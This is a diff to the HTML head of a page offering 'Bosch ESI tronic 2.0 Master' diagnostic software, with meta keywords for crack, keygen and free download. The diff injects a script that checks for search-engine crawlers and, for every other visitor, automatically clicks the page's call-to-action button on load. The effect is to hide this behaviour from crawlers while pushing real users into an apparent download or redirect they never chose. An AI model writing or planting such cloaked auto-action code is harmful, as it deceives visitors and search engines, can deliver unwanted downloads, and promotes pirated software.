@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bosch ESI tronic 2.0 Master with 1 year updates</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Bosch ESI tronic 2.0 Master with 1 year updates. Compatible with Bosch KTS diagnostic devices and covers 90,000 vehicles from 150 brands.">
     <meta name="keywords" content="Bosch ESI tronic 2.0 Master, Bosch ESI tronic 2.0 Master download, Bosch ESI tronic 2.0 Master free download, Bosch ESI tronic 2.0 Master 2024, Bosch ESI tronic 2.0 Master crack, Bosch ESI tronic diagnostic software, Bosch ESI tronic diagnostic software download, Bosch ESI tronic diagnostic software free download, Bosch ESI tronic software keygen, Bosch ESI tronic software crack, Bosch ESI tronic software 2024, Bosch ESI tronic 2.0 Master keygen, Bosch ESI tronic 2.0 Master versions, Bosch ESI tronic 2.0 Master updates, Bosch ESI tronic 2.0 Master pdf, Bosch ESI tronic 2.0 Master pdf free download, Bosch ESI tronic 2.0 manual, Bosch ESI tronic diagnostic system, Bosch ESI tronic 2.0 2023, Bosch ESI tronic 2.0 2017, Bosch KTS diagnostic devices, Bosch KTS diagnostic software, Bosch vehicle data software, Bosch diagnostic software download, Bosch diagnostic software free download, Bosch diagnostic software crack, Бош ESI tronic 2.0 мастер, Бош ESI tronic 2.0 мастер скачать, Бош ESI tronic 2.0 мастер скачать бесплатно, Бош ESI tronic 2.0 мастер 2024, Бош ESI tronic диагностическая программа, Бош ESI tronic диагностическая программа скачать, Бош ESI tronic диагностическая программа скачать бесплатно, Бош ESI tronic диагностическая программа кряк, Бош ESI tronic диагностическое ПО, Бош ESI tronic программное обеспечение, Бош диагностическое ПО скачать, Бош диагностическое ПО скачать бесплатно, Bош диагностическое ПО кряк">
     <style>
